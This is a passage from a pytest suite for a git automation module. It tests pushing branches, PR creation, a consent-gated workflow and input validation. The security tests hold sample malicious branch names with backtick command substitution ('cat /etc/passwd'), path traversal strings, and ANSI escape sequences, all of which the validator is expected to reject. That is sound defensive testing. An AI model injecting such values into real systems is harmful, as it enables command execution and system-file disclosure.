
        assert result['success'] is False
        assert 'error' in result


class TestPushAndCreatePR:
    """Tests for push_and_create_pr() function."""

    @patch('auto_implement_git_integration.subprocess.run')
    @patch('auto_implement_git_integration.invoke_pr_description_agent')
    def test_push_only_success(self, mock_agent, mock_run):
        """Test push without PR creation."""
        try:
            from auto_implement_git_integration import push_and_create_pr
        except ImportError:
            pytest.skip("push_and_create_pr not yet implemented")

        mock_run.return_value = Mock(returncode=0, stdout='')

        result = push_and_create_pr(
            branch='feature/test',
            create_pr=False
        )

        assert result['success'] is True
        assert result['pushed'] is True
        assert result.get('pr_created') is False

    @patch('auto_implement_git_integration.subprocess.run')
    @patch('auto_implement_git_integration.invoke_pr_description_agent')
    def test_push_and_create_pr_success(self, mock_agent, mock_run):
        """Test push with PR creation."""
        try:
            from auto_implement_git_integration import push_and_create_pr
        except ImportError:
            pytest.skip("push_and_create_pr not yet implemented")

        mock_agent.return_value = {
            'success': True,
            'output': '## Summary\n\nAdd user authentication',
            'error': ''
        }
        mock_run.side_effect = [
            Mock(returncode=0, stdout=''),  # git push
            Mock(returncode=0, stdout='https://github.com/user/repo/pull/123')  # gh pr create
        ]

        result = push_and_create_pr(
            branch='feature/auth',
            create_pr=True,
            request='Add authentication'
        )

        assert result['success'] is True
        assert result['pushed'] is True
        assert result['pr_created'] is True
        assert 'pr_url' in result

    @patch('auto_implement_git_integration.subprocess.run')
    def test_push_failure(self, mock_run):
        """Test handling of push failure."""
        try:
            from auto_implement_git_integration import push_and_create_pr
        except ImportError:
            pytest.skip("push_and_create_pr not yet implemented")

        mock_run.side_effect = CalledProcessError(1, 'git push', stderr='rejected')

        result = push_and_create_pr(
            branch='feature/test',
            create_pr=False
        )

        assert result['success'] is False
        assert 'error' in result
        assert result['pushed'] is False


class TestExecuteGitWorkflow:
    """Tests for execute_git_workflow() function."""

    @patch('auto_implement_git_integration.check_consent_via_env')
    @patch('auto_implement_git_integration.validate_git_state')
    @patch('auto_implement_git_integration.create_commit_with_agent_message')
    def test_execute_workflow_commit_only(self, mock_commit, mock_validate, mock_consent):
        """Test workflow with commit only (no push/PR)."""
        try:
            from auto_implement_git_integration import execute_git_workflow
        except ImportError:
            pytest.skip("execute_git_workflow not yet implemented")

        mock_consent.return_value = {
            'git_enabled': True,
            'push_enabled': False,
            'pr_enabled': False,
            'all_enabled': False
        }
        mock_validate.return_value = True
        mock_commit.return_value = {'success': True, 'commit_sha': 'abc123'}

        result = execute_git_workflow(
            workflow_id='test-123',
            files=['src/test.py'],
            request='Test feature'
        )

        assert result['success'] is True
        assert result['committed'] is True
        assert result['pushed'] is False

    @patch('auto_implement_git_integration.check_consent_via_env')
    def test_execute_workflow_consent_disabled(self, mock_consent):
        """Test workflow skipped when consent disabled."""
        try:
            from auto_implement_git_integration import execute_git_workflow
        except ImportError:
            pytest.skip("execute_git_workflow not yet implemented")

        mock_consent.return_value = {
            'git_enabled': False,
            'push_enabled': False,
            'pr_enabled': False,
            'all_enabled': False
        }

        result = execute_git_workflow(
            workflow_id='test-123',
            files=['src/test.py'],
            request='Test'
        )

        assert result['success'] is True
        assert result['skipped'] is True


class TestExecuteStep8GitOperations:
    """Tests for execute_step8_git_operations() function."""

    @patch('auto_implement_git_integration.execute_git_workflow')
    def test_step8_success(self, mock_workflow):
        """Test successful Step 8 execution."""
        try:
            from auto_implement_git_integration import execute_step8_git_operations
        except ImportError:
            pytest.skip("execute_step8_git_operations not yet implemented")

        mock_workflow.return_value = {
            'success': True,
            'committed': True,
            'commit_sha': 'abc123',
            'pushed': True,
            'pr_created': False
        }

        result = execute_step8_git_operations(
            workflow_id='workflow-123',
            branch='feature/test',
            request='Add test feature'
        )

        assert result['success'] is True

    @patch('auto_implement_git_integration.execute_git_workflow')
    def test_step8_first_run_warning(self, mock_workflow):
        """Test first-run warning integration."""
        try:
            from auto_implement_git_integration import execute_step8_git_operations
        except ImportError:
            pytest.skip("execute_step8_git_operations not yet implemented")

        mock_workflow.return_value = {'success': True, 'committed': True}

        with patch('auto_implement_git_integration.should_show_warning', return_value=True):
            with patch('auto_implement_git_integration.show_first_run_warning', return_value=True):
                result = execute_step8_git_operations(
                    workflow_id='workflow-123',
                    branch='feature/test',
                    request='Test'
                )

                assert result['success'] is True


class TestSecurityValidationCWE:
    """Tests for CWE-specific security validations."""

    def test_cwe78_branch_name_command_injection_backticks(self):
        """CWE-78: Block backtick command substitution in branch names."""
        try:
            from auto_implement_git_integration import validate_branch_name
        except ImportError:
            pytest.skip("validate_branch_name not yet implemented")

        malicious_names = [
            'feature/`whoami`',
            'branch/test`cat /etc/passwd`',
        ]

        for name in malicious_names:
            with pytest.raises(ValueError):
                validate_branch_name(name)

    def test_cwe22_branch_name_path_traversal(self):
        """CWE-22: Block path traversal in branch names."""
        try:
            from auto_implement_git_integration import validate_branch_name
        except ImportError:
            pytest.skip("validate_branch_name not yet implemented")

        traversal_attempts = [
            '../../../etc/passwd',
            'feature/../../../root',
            'branch/..\\..\\windows\\system32',
        ]

        for name in traversal_attempts:
            with pytest.raises(ValueError):
                validate_branch_name(name)

    def test_cwe117_commit_message_allows_newlines(self):
        """CWE-117: Allow legitimate newlines in commit messages."""
        try:
            from auto_implement_git_integration import validate_commit_message
        except ImportError:
            pytest.skip("validate_commit_message not yet implemented")

        valid_multiline = (
            'feat: add user authentication\n'
            '\n'
            'This implements JWT-based authentication.\n'
            'Fixes #123'
        )

        result = validate_commit_message(valid_multiline)
        assert '\n' in result  # Newlines preserved

    def test_cwe117_commit_message_blocks_ansi(self):
        """CWE-117: Block ANSI escape sequences in commit messages."""
        try:
            from auto_implement_git_integration import validate_commit_message
        except ImportError:
            pytest.skip("validate_commit_message not yet implemented")

        ansi_attempts = [
            'feat: test\x1b[31mRED\x1b[0m',  # ANSI color
            'fix: \x1b[2J\x1b[H clear screen',  # ANSI clear
        ]

        for msg in ansi_attempts:
            with pytest.raises(ValueError):
                validate_commit_message(msg)
